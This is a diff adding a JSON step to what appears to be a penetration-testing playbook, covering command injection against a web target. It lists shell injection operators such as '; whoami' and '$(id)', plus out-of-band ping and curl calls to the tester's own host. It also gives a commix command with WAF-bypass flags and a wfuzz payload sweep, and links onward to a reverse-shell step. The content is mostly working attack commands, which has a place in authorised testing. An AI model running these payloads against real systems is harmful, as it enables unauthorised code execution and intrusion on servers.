@@ -1,0 +1,14 @@
+{
+  "id": "cmd_injection",
+  "phase": "WEB",
+  "title": "Command Injection",
+  "body": "Confirmed OS command execution. Test operators manually, then use commix for automation and WAF bypass.",
+  "cmd": "# Manual operators — try each\n; whoami\n| id\n|| id\n& id\n&& id\n`id`\n$(id)\n\n# Out-of-band detection (if blind)\n; ping -c1 $lhost\n; curl http://$lhost/\n\n# commix — automated, WAF-aware\ncommix --url=\"http://$ip/page?param=\" \\\n  --level=3 --force-ssl --skip-waf --random-agent\n\n# wfuzz wordlist sweep\nwfuzz -c -z file,/usr/share/wordlists/Fuzzing/command-injection.txt \\\n  -d \"field=FUZZ\" \"http://$ip/page\"",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Confirmed RCE — get reverse shell",
+      "next": "reverse_shell"
+    }
+  ]
+}
